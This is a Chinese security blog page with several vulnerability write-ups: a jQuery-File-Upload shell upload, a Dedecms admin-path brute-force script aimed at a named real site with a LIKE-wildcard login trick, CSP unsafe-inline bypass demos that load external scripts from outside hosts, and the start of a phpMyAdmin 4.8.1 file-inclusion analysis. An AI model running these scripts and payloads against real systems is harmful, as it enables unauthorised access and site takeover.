<p>就能直接上传成功了,上传到了files目录中。 但是访问后发现脚本没有执行。<br>在files目录下 有着一个.htaccess</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># To enable the Headers module, execute the following command and reload Apache:</span><br><span class="line"># sudo a2enmod headers</span><br><span class="line"></span><br><span class="line"># The following directives prevent the execution of script files</span><br><span class="line"># in the context of the website.</span><br><span class="line"># They also force the content-type application&#x2F;octet-stream and</span><br><span class="line"># force browsers to display a download dialog for non-image files.</span><br><span class="line">SetHandler default-handler</span><br><span class="line">ForceType application&#x2F;octet-stream</span><br><span class="line">Header set Content-Disposition attachment</span><br><span class="line"></span><br><span class="line"># The following unsets the forced type and Content-Disposition headers</span><br><span class="line"># for known image files:</span><br><span class="line">&lt;FilesMatch &quot;(?i)\.(gif|jpe?g|png)$&quot;&gt;</span><br><span class="line">	ForceType none</span><br><span class="line">	Header unset Content-Disposition</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br><span class="line"></span><br><span class="line"># The following directive prevents browsers from MIME-sniffing the content-type.</span><br><span class="line"># This is an important complement to the ForceType directive above:</span><br><span class="line">Header set X-Content-Type-Options nosniff</span><br><span class="line"></span><br><span class="line"># Uncomment the following lines to prevent unauthorized download of files:</span><br><span class="line">#AuthName &quot;Authorization required&quot;</span><br><span class="line">#AuthType Basic</span><br><span class="line">#require valid-user</span><br></pre></td></tr></table></figure>

<blockquote>
<p>The directives ForceType and SetHandler are used to associated all the files in a given location (e.g., a particular directory) onto a particular MIME type or handler.</p>
</blockquote>
<p>.htaccess配置了 在files目录下 强制由default-handler来处理所有文件m, 并且强制mime type为application/octet-stream， 使files目录下的脚本不会被执行。开发者也是因为配置了.htaccess的情况下, 以为是绝对的安全了, 所以才没有进行验证后缀。</p>
<p>这里虽然配置了.htaccess 但仍然有两个安全隐患<br>1: .htaccess只对apache有效, 而在纯nginx(非反向代理)中是无效的, 在jquery-upload的readme中 好像也并没有看到有说明使用nginx时的安全隐患。</p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/jq_2.jpg" alt="-w630"></p>
<p>2: 在apache 2.3.9以后, allowoverride默认为none</p>
<p><a target="_blank" rel="noopener" href="https://httpd.apache.org/docs/current/mod/core.html#allowoverride">https://httpd.apache.org/docs/current/mod/core.html#allowoverride</a></p>
<blockquote>
<p>AllowOverride Directive<br>Description:    Types of directives that are allowed in .htaccess files<br>Syntax:    AllowOverride All|None|directive-type [directive-type] …<br>Default:    AllowOverride None (2.3.9 and later), AllowOverride All (2.3.8 and earlier)<br>Context:    directory<br>Status:    Core<br>Module:    core</p>
</blockquote>
<p>可以看到很清楚的说明了, 在apache 2.3.9及以后版本 allowoverride默认为none,<br>在2.3.8及之前版本allowoverride默认为all。<br>allowoverride指定了在.htaccess配置文件中, 可以覆盖掉主配置文件的指令。 当allowoverride为none时, .htaccess文件就失去了它的作用, 所以jquery-upload中对files目录所设置的拒绝脚本文件执行也就失效了。 导致了getshell。</p>
<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>Jquery-file-upload在9.22.1版本中修复了该漏洞。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/jq_3.jpg" alt="-w977"><br>在实例化UploadHandler类的时候, 传递了一个数组进去。数组里面带了一个accept_file_types来验证后缀。<br>在UploadHandler类的构造方法中, </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if ($options) &#123;</span><br><span class="line">    $this-&gt;options &#x3D; $options + $this-&gt;options;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>把传递进来的数组和自身的配置变量数组用加号进行合并,<br>使用加号合并时 出现key冲突时 前面的数组对应的value会覆盖掉后面的。<br>所以这时<br><code>$this-&gt;options[&#39;accept_file_types&#39;]</code>为 <code>&#39;/\.(gif|jpe?g|png)$/i&#39;    </code><br>在上传之前的validate方法中有通过获取accept_file_types来正则验证上传的文件名, 所以修复后就只能上传图片文件了。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/jq_4.jpg" alt="-w965"><br>修复后再上传脚本文件就失败了。</p>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>1:  <a target="_blank" rel="noopener" href="https://httpd.apache.org/docs/current/mod/core.html#allowoverride">https://httpd.apache.org/docs/current/mod/core.html#allowoverride</a></p>
<p>2:  <a target="_blank" rel="noopener" href="https://github.com/blueimp/jQuery-File-Upload/blob/master/VULNERABILITIES.md">https://github.com/blueimp/jQuery-File-Upload/blob/master/VULNERABILITIES.md</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/web/">web</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2018/09/20/dedecms-guess-admin-username-trick/"><span>Dedecms 猜后台管理员账号的一个小技巧</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2018/09/20/dedecms-guess-admin-username-trick/" rel="bookmark">
        <time class="entry-date published" datetime="2018-09-20T12:58:29.000Z">
          2018-09-20
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>巅峰极客里遇到的一个案例(yx-tv.com)。</p>
<p>案例为,windows下的dedecms 好像是2017版本, 开启了会员中心,修改了后台的路径,<br>然后用之前windows下dedecms找后台路径的方法, 发现tags.php被删除了,<br>但是plus/rss.php文件存在, 然后用这方法就成功的找到了后台。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">payloads &#x3D; &#39;abcdefghijklmnopqrstuvwxyz0123456789_-&#39;</span><br><span class="line"></span><br><span class="line">menu &#x3D; &#39;&#39;</span><br><span class="line">for k in range(10):</span><br><span class="line">    for payload in payloads:</span><br><span class="line">        data &#x3D; &quot;dopost&#x3D;save&amp;_FILES[b4dboy][tmp_name]&#x3D;..&#x2F;%s%s&lt;&#x2F;images&#x2F;admin_top_logo.gif&amp;_FILES[b4dboy][name]&#x3D;0&amp;_FILES[b4dboy][size]&#x3D;0&amp;_FILES[b4dboy][type]&#x3D;image&#x2F;gif&quot;% (menu, payload)</span><br><span class="line">        res &#x3D; requests.post(&quot;http:&#x2F;&#x2F;www.yx-tv.com&#x2F;plus&#x2F;rss.php&quot;, data&#x3D;data, headers&#x3D;&#123;&quot;Content-Type&quot;:&quot;application&#x2F;x-www-form-urlencoded&quot;&#125;)</span><br><span class="line">        if res.content.decode(&quot;utf-8&quot;).find(&quot;Error&quot;) &gt; -1:</span><br><span class="line">            menu +&#x3D; payload</span><br><span class="line">            break</span><br><span class="line">        if payload &#x3D;&#x3D; &#39;-&#39;:</span><br><span class="line">            print(menu)</span><br><span class="line">            sys.exit()</span><br><span class="line">print(menu)</span><br></pre></td></tr></table></figure>

<p>然后猜了下后台的管理员账户, 没猜到, admin直接提示账户不存在。<br>然后再利用之前的重置管理员密码的漏洞。<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/1959">https://xz.aliyun.com/t/1959</a><br>成功重置了管理员的密码, 但是修改cookie登录后, 发现显示的管理员账号是admin, 但是之前在登录后台的时候试了下admin, 是直接提示的账户不存在。<br>(好像是显示的是uname, 但是最终登录是看的userid)</p>
<p>后面发现在dede/login.php中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$res &#x3D; $cuserLogin-&gt;checkUser($userid,$pwd);</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> *  检验用户是否正确</span><br><span class="line"> *</span><br><span class="line"> * @access    public</span><br><span class="line"> * @param     string    $username  用户名</span><br><span class="line"> * @param     string    $userpwd  密码</span><br><span class="line"> * @return    string</span><br><span class="line"> *&#x2F;</span><br><span class="line">function checkUser($username, $userpwd)</span><br><span class="line">&#123;</span><br><span class="line">    global $dsql;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;只允许用户名和密码用0-9,a-z,A-Z,&#39;@&#39;,&#39;_&#39;,&#39;.&#39;,&#39;-&#39;这些字符</span><br><span class="line">    $this-&gt;userName &#x3D; preg_replace(&quot;&#x2F;[^0-9a-zA-Z_@!\.-]&#x2F;&quot;, &#39;&#39;, $username);</span><br><span class="line">    $this-&gt;userPwd &#x3D; preg_replace(&quot;&#x2F;[^0-9a-zA-Z_@!\.-]&#x2F;&quot;, &#39;&#39;, $userpwd);</span><br><span class="line">    $pwd &#x3D; substr(md5($this-&gt;userPwd), 5, 20);</span><br><span class="line">    $dsql-&gt;SetQuery(&quot;SELECT admin.*,atype.purviews FROM &#96;#@__admin&#96; admin LEFT JOIN &#96;#@__admintype&#96; atype ON atype.rank&#x3D;admin.usertype WHERE admin.userid LIKE &#39;&quot;.$this-&gt;userName.&quot;&#39; LIMIT 0,1&quot;);</span><br><span class="line">    $dsql-&gt;Execute();</span><br><span class="line">    $row &#x3D; $dsql-&gt;GetObject();</span><br><span class="line">    if(!isset($row-&gt;pwd))</span><br><span class="line">    &#123;</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line">    else if($pwd!&#x3D;$row-&gt;pwd)</span><br><span class="line">    &#123;</span><br><span class="line">        return -2;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        $loginip &#x3D; GetIP();</span><br><span class="line">        $this-&gt;userID &#x3D; $row-&gt;id;</span><br><span class="line">        $this-&gt;userType &#x3D; $row-&gt;usertype;</span><br><span class="line">        $this-&gt;userChannel &#x3D; $row-&gt;typeid;</span><br><span class="line">        $this-&gt;userName &#x3D; $row-&gt;uname;</span><br><span class="line">        $this-&gt;userPurview &#x3D; $row-&gt;purviews;</span><br><span class="line">        $inquery &#x3D; &quot;UPDATE &#96;#@__admin&#96; SET loginip&#x3D;&#39;$loginip&#39;,logintime&#x3D;&#39;&quot;.time().&quot;&#39; WHERE id&#x3D;&#39;&quot;.$row-&gt;id.&quot;&#39;&quot;;</span><br><span class="line">        $dsql-&gt;ExecuteNoneQuery($inquery);</span><br><span class="line">        $sql &#x3D; &quot;UPDATE #@__member SET logintime&#x3D;&quot;.time().&quot;, loginip&#x3D;&#39;$loginip&#39; WHERE mid&#x3D;&quot;.$row-&gt;id;</span><br><span class="line">        $dsql-&gt;ExecuteNoneQuery($sql);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先通过用户输入的用户名查询出密码, 如果有记录的话, 就比对密码。<br>但是在这里 根据用户名查询密码的时候</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WHERE admin.userid LIKE &#39;&quot;.$this-&gt;userName.&quot;</span><br></pre></td></tr></table></figure>
<p>竟然是用的like。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;userName &#x3D; preg_replace(&quot;&#x2F;[^0-9a-zA-Z_@!\.-]&#x2F;&quot;, &#39;&#39;, $username);</span><br></pre></td></tr></table></figure>
<p>虽然在前面有把一些用户名不允许的字符给替换为空了, 想直接用%这种匹配任意数量字符的模糊查询出数据就不行了。<br>但是可以看到这个过滤没有把_替换为空。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">With LIKE you can use the following two wildcard characters in the pattern:</span><br><span class="line"></span><br><span class="line">% matches any number of characters, even zero characters.</span><br><span class="line"></span><br><span class="line">_ matches exactly one character.</span><br></pre></td></tr></table></figure>

<p>在mysql中的模糊查询中, _也代表着匹配一个任意字符。</p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/dede_guess_1.jpg" alt="-w1406"></p>
<p>所以在不知道管理员的用户名的情况下， 只要去用_跑一下, 当_的位数和管理员账户的位数相同时即可登录成功了。 </p>
<p>巅峰极客的是4位数, 然后用之前修改管理员密码的洞修改的密码, 就成功登录了后台, 然后后台getshell, 就搞定了。</p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2018/07/15/CSP-unsafe-inline时-引入外部js/"><span>CSP unsafe-inline时, 引入外部js</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2018/07/15/CSP-unsafe-inline时-引入外部js/" rel="bookmark">
        <time class="entry-date published" datetime="2018-07-15T02:42:07.000Z">
          2018-07-15
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>原文: <a target="_blank" rel="noopener" href="https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa">https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa</a><br>用自己的理解, 把这个文章比较通俗的翻译补充了一下。</p>
<hr>
<h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><p>当csp有Unsafe-inline时, 并且受限于csp无法直接引入外部js, 当frame-src 为self, 或者能引入当前域的资源的时候, 即有一定可能能够引入外部js。</p>
<hr>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>虽说在CSP有unsafe-inline的时候, 已经能够很轻松的把cookie给传递出去了。 但是如果想引入xss平台的js的时候, 也很麻烦。 因为xss平台的js因为功能很多, 所以通常js文件都很大, 在unsafe-inline的情况下,很可能有长度限制之类的导致没法执行到xss平台的js。 </p>
<p>CSP测试环境。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: <span class="keyword">default</span>-src <span class="string">&#x27;self&#x27;</span> <span class="string">&#x27;unsafe-inline&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>在上CSP的时候, 一些静态文件中是可能不上CSP的。并且如果这个静态文件没有 X-Frame-Options: Deny(禁止该文件被iframe)响应头的话,这个时候我们iframe去打开这个没有CSP的静态文件, iframe相当于另外打开一个窗口,因为是同源的, 然后我们操作dom往iframe新打开的窗口里写入script标签去引入外部js, 就可以无视script-src self的限制了。</p>
<p>demo</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-Security-Policy: default-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> frame = document.createElement(<span class="string">&quot;iframe&quot;</span>);</span><br><span class="line">    frame.href = <span class="string">&quot;/robots.txt&quot;</span>;</span><br><span class="line">    document.body.appendChild(frame);</span><br><span class="line"></span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> script = document.createElement(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">        script.src = <span class="string">&#x27;//xxx.com/a.js&#x27;</span>;</span><br><span class="line">        window.frames[<span class="number">0</span>].document.body.appendChild(script);</span><br><span class="line">    &#125;,<span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p><img src="http://onw16foqc.bkt.clouddn.com/15316201005176.jpg"></p>
<p><img src="http://onw16foqc.bkt.clouddn.com/15316201220145.jpg"></p>
<p>成功加载了外部的js了。</p>
<p>但是如果是在nginx的配置文件中, add_header 来做csp的话,</p>
<p>那么所有静态文件中, 也会返回CSP。<br>在nginx文档中有写到,</p>
<blockquote>
<p>Directives<br>Syntax:    add_header name value [always];<br>Default:    —<br>Context:    http, server, location, if in location<br>Adds the specified field to a response header provided that the response code equals 200, 201 (1.3.10), 204, 206, 301, 302, 303, 304, 307 (1.1.16, 1.0.13), or 308 (1.13.0). The value can contain variables.</p>
</blockquote>
<blockquote>
<p>There could be several add_header directives. These directives are inherited from the previous level if and only if there are no add_header directives defined on the current level.</p>
</blockquote>
<blockquote>
<p>If the always parameter is specified (1.7.5), the header field will be added regardless of the response code.</p>
</blockquote>
<p>当没有设置always的时候, 如果response code为4xx或者5xx的时候, add_header 不会起作用。 那么当这个时候, 我们可以iframe引入4xx/5xx的页面, 然后往4xx/5xx的页面里面dom里插入script标签。 如果设置了always的话, 无论什么response code, 都会添加响应头。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add_header Content-Security-Policy &quot;default-src &#39;self&#39; &#39;unsafe-inline&#39;;&quot;;</span><br></pre></td></tr></table></figure>

<p>配置文件中加上add_header, csp<br><img src="http://onw16foqc.bkt.clouddn.com/15316204267818.jpg"></p>
<p><img src="http://onw16foqc.bkt.clouddn.com/15316205958389.jpg"></p>
<p>静态文件中也都有了csp了。<br>这里我们利用4xx页面, 4xx页面最简单的肯定就是404了。<br>当然还有一些其他触发4xx页面的方法。</p>
<p>1)超长url</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">var frame &#x3D; document.createElement(&quot;iframe&quot;);</span><br><span class="line">frame.src &#x3D; &quot;a&quot;.repeat(10000);</span><br><span class="line">document.body.appendChild(frame);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p><img src="http://onw16foqc.bkt.clouddn.com/15316212060660.jpg"></p>
<p>2)超长cookie</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    for(var i&#x3D;0;i&lt;5;i++)&#123;document.cookie&#x3D;i+&quot;&#x3D;&quot;+&quot;a&quot;.repeat(10000)&#125;;</span><br><span class="line">    var frame &#x3D; document.createElement(&quot;iframe&quot;);</span><br><span class="line">    frame.src &#x3D; &quot;a&quot;;</span><br><span class="line">    document.body.appendChild(frame);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p><img src="http://onw16foqc.bkt.clouddn.com/15316214231361.jpg"><br>3)不正确的unicode路径<br>utf不存在g开头的,<br><img src="http://onw16foqc.bkt.clouddn.com/15316217028727.jpg"></p>
<p>4)<br>nginx在主目录上继续往上级目录跳的时候, 也会出现400<br><img src="http://onw16foqc.bkt.clouddn.com/15316217870523.jpg"></p>
<p>不过相比起这些4xx, 肯定404是最好找到的了。<br>不过现在404各种风格, 也有404页面的reponse code为200或者302的。 那么上面那些其他4xx的就有作用了。</p>
<p>add_header设置csp后。<br><img src="http://onw16foqc.bkt.clouddn.com/15316206301550.jpg"></p>
<p>404页面中没有csp。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-Security-Policy: default-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> frame = document.createElement(<span class="string">&quot;iframe&quot;</span>);</span><br><span class="line">    frame.src = <span class="string">&quot;/404notfound&quot;</span>;</span><br><span class="line">    document.body.appendChild(frame);</span><br><span class="line"></span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> script = document.createElement(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">        script.src = <span class="string">&#x27;//xxx.com/a.js&#x27;</span>;</span><br><span class="line">        window.frames[<span class="number">0</span>].document.body.appendChild(script);</span><br><span class="line">    &#125;,<span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p><img src="http://onw16foqc.bkt.clouddn.com/15316207621780.jpg"></p>
<p><img src="http://onw16foqc.bkt.clouddn.com/15316207741758.jpg"></p>
<p>可以引入外部js了。<br>当然这种引入4xx/5xx页面的方法, 如果add_header的时候设置了always的话, 也是没办法利用的了。</p>
<p>除了iframe以外, object和embed也可以, 一样的原理。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-Security-Policy: default-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> embed = document.createElement(<span class="string">&quot;embed&quot;</span>);</span><br><span class="line">    embed.src = <span class="string">&quot;/hhhhhhh&quot;</span>;</span><br><span class="line">    document.body.appendChild(embed);</span><br><span class="line"></span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> script = document.createElement(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">        script.src = <span class="string">&#x27;//cm2.in/12&#x27;</span>;</span><br><span class="line">        window.frames[<span class="number">0</span>].document.body.appendChild(script);</span><br><span class="line">    &#125;,<span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p><img src="http://onw16foqc.bkt.clouddn.com/15316222985557.jpg"></p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa">https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/Web/">Web</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2018/07/07/phpMyAdmin4-8-1-文件包含漏洞/"><span>phpMyAdmin4.8.1 文件包含漏洞</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2018/07/07/phpMyAdmin4-8-1-文件包含漏洞/" rel="bookmark">
        <time class="entry-date published" datetime="2018-07-07T08:58:59.000Z">
          2018-07-07
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>一个很简单的漏洞, 分析的文章也都出来了很多, 但是看了那些文章, 我一直搞不懂为啥问号要双重url编码, 我自己看那些文章感觉不编码应该也能成功利用的。 并且好像大家对问号编码的说法各有不同。 还是自己下载了份源码看了一下。</p>
<blockquote>
<p><img src="http://onw16foqc.bkt.clouddn.com/15309457552552.jpg"></p>
</blockquote>
<blockquote>
<p><img src="http://onw16foqc.bkt.clouddn.com/15309458322102.jpg"></p>
</blockquote>
<p>4.8.1下载地址:<a target="_blank" rel="noopener" href="https://files.phpmyadmin.net/phpMyAdmin/4.8.1/phpMyAdmin-4.8.1-all-languages.zip">https://files.phpmyadmin.net/phpMyAdmin/4.8.1/phpMyAdmin-4.8.1-all-languages.zip</a></p>
<hr>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>在index.php中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; If we have a valid target, let&#39;s load that script instead</span><br><span class="line">if (! empty($_REQUEST[&#39;target&#39;])</span><br><span class="line">    &amp;&amp; is_string($_REQUEST[&#39;target&#39;])</span><br><span class="line">    &amp;&amp; ! preg_match(&#39;&#x2F;^index&#x2F;&#39;, $_REQUEST[&#39;target&#39;])</span><br><span class="line">    &amp;&amp; ! in_array($_REQUEST[&#39;target&#39;], $target_blacklist)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity($_REQUEST[&#39;target&#39;])</span><br><span class="line">) &#123;</span><br><span class="line">    include($_REQUEST[&#39;target&#39;]);</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以加载一些脚本。<br>直接看最后一个检测</p>
